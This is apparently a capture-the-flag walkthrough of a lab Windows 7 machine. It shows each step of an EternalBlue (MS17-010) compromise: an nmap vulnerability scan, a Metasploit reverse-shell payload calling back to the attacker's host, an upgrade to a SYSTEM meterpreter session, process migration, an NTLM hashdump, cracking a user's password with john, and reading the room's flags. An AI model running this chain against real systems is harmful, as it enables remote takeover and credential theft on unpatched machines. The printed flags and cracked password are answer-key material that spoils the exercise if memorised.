export IP = 10.10.120.194

1. port scan machine for vulnerability

sudo nmap -sV -vv --script=vuln 10.10.120.194

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED



2. search msfconsole for ms17-010 exploit

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 


3. input needed details and run

set payload windows/x64/shell/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                             /wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.2.77.171      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > 


4. once done, background the session then run post/multi/manage/shell_to_meterpreter 

msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.77.171:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (200774 bytes) to 10.10.120.194
[*] Meterpreter session 2 opened (10.2.77.171:4433 -> 10.10.120.194:49184) at 2022-08-09 23:21:14 -0400
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         shell x64/windows                                      10.2.77.171:4444 -> 10.10.120.194:49170 (10.10.1
                                                                   20.194)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.2.77.171:4433 -> 10.10.120.194:49184 (10.10.1
                                                                   20.194)

msf6 post(multi/manage/shell_to_meterpreter) > 

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > 

5. check ps for NT AUTHORITY\ SYSTEM and migrate process (use services.exe)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         shell x64/windows                                      10.2.77.171:4444 -> 10.10.120.194:49170 (10.10.1
                                                                   20.194)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.2.77.171:4433 -> 10.10.120.194:49184 (10.10.1
                                                                   20.194)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...


meterpreter > ps

Process List
============

 PID   PPID  Name                Arch  Session  User                          Path
 ---   ----  ----                ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System              x64   0
 416   4     smss.exe            x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 500   684   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
 540   532   csrss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 556   684   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
 584   684   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
 588   532   wininit.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 600   580   csrss.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 640   580   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 684   588   services.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 704   588   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 712   588   lsm.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 816   684   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
 900   684   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
 976   640   LogonUI.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1112  684   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
 1208  684   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
 1332  684   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1368  684   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
 1428  684   amazon-ssm-agent.e  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ss
             xe                                                               m-agent.exe
 1484  684   LiteAgent.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\Lite
                                                                              Agent.exe
 1504  816   WmiPrvSE.exe
 1600  684   Ec2Config.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigServ
                                                                              ice\Ec2Config.exe
 1964  684   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
 2088  540   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2296  1332  cmd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2600  684   TrustedInstaller.e  x64   0        NT AUTHORITY\SYSTEM
             xe
 2872  684   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
 2904  2832  powershell.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell
                                                                              \v1.0\powershell.exe
 2912  684   sppsvc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 2948  684   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
 3032  540   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 3056  684   SearchIndexer.exe   x64   0        NT AUTHORITY\SYSTEM

meterpreter > migrate 684
[*] Migrating from 2904 to 684...
[*] Migration completed successfully.
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > 

6. non-user ID - JON

7. Crack the hash using hashcat or john

┌──(kali㉿kali)-[~/ken/blue]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)     
1g 0:00:00:00 DONE (2022-08-09 23:58) 2.222g/s 22667Kp/s 22667Kc/s 22667KC/s alqui..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
                                                                                                                     
┌──(kali㉿kali)-[~/ken/blue]
└─$ 

8. Access the C: directory and find the flag1.txt

meterpreter > pwd
C:\Windows\system32
meterpreter > cd ..
meterpreter > cd ..
meterpreter > shell
Process 1756 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
08/09/2022  10:39 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,317,159,424 bytes free

C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}
C:\>

9. Use search in meterpreter to check for the other flags

meterpreter > search -f flag*txt
Found 3 results...
==================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-17 15:26:36 -0400
c:\Windows\System32\config\flag2.txt  34            2019-03-17 15:32:48 -0400
c:\flag1.txt                          24            2019-03-17 15:27:21 -0400

meterpreter > 

10. open the remaining flags to complete the room.

meterpreter > cat "c:\Windows\System32\config\flag2.txt"
flag{sam_database_elevated_access}meterpreter > 
meterpreter > 
meterpreter > cat "c:\Users\Jon\Documents\flag3.txt"
flag{admin_documents_can_be_valuable}meterpreter > 




